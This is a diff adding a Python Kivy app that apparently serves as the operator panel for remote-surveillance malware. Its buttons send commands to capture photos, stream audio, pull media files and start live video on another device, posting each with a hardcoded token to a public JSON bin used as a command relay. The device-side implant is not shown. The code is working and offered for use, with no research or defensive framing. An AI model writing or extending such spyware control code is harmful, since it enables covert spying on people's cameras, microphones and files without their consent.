@@ -1,0 +1,64 @@
+import urllib.request
+import json
+import threading
+from kivy.app import App
+from kivy.uix.boxlayout import BoxLayout
+from kivy.uix.button import Button
+from kivy.uix.label import Label
+
+# Tera npoint.io link yahan set ho gaya hai
+API_URL = "https://api.npoint.io/7d91bc63aa9160b6858b"
+SECRET_TOKEN = "bhai123"
+
+class ControllerApp(App):
+    def build(self):
+        layout = BoxLayout(orientation='vertical', padding=20, spacing=15)
+        
+        self.status_label = Label(text="Status: Controller Ready", size_hint_y=None, height=50)
+        layout.add_widget(self.status_label)
+        
+        btn_photo = Button(text="📸 Capture Remote Photo", background_color=(0.1, 0.6, 0.8, 1))
+        btn_photo.bind(on_press=lambda x: self.send_command("CAPTURE_PHOTO"))
+        layout.add_widget(btn_photo)
+        
+        btn_audio = Button(text="🎙️ Start Audio Stream", background_color=(0.2, 0.7, 0.3, 1))
+        btn_audio.bind(on_press=lambda x: self.send_command("START_AUDIO"))
+        layout.add_widget(btn_audio)
+        
+        btn_files = Button(text="📥 Pull Media Files", background_color=(0.9, 0.5, 0.1, 1))
+        btn_files.bind(on_press=lambda x: self.send_command("PULL_FILES"))
+        layout.add_widget(btn_files)
+        
+        btn_video = Button(text="🎥 Live Video Feed", background_color=(0.8, 0.2, 0.2, 1))
+        btn_video.bind(on_press=lambda x: self.send_command("LIVE_VIDEO"))
+        layout.add_widget(btn_video)
+        
+        return layout
+
+    def send_command(self, cmd_name):
+        threading.Thread(target=self._post_to_cloud, args=(cmd_name,)).start()
+
+    def _post_to_cloud(self, cmd_name):
+        try:
+            self.status_label.text = f"Sending: {cmd_name}..."
+            payload = {"command": cmd_name, "token": SECRET_TOKEN}
+            data_bytes = json.dumps(payload).encode('utf-8')
+            
+            req = urllib.request.Request(
+                API_URL, 
+                data=data_bytes, 
+                headers={'Content-Type': 'application/json'}, 
+                method='POST'
+            )
+            
+            with urllib.request.urlopen(req, timeout=5) as response:
+                if response.status == 200:
+                    self.status_label.text = f"Success: {cmd_name} sent!"
+                else:
+                    self.status_label.text = "Failed to send."
+        except Exception as e:
+            self.status_label.text = "Connection Error!"
+
+if __name__ == '__main__':
+    ControllerApp().run()
+    
